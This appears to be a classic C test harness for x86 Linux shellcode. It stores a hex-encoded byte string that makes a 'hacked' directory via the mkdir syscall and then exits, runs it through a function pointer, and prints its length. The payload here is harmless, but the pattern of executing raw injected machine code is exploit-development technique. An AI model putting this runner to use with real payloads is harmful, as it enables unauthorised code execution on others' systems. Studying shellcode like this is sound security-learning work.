#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x04\x27\x57\x66\x68\x65\x64\x68\x68\x61\x63\x6b\x89\xe3\x66\xb9\xed\x01\xcd\x80\x04\x01\x31\xdb\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
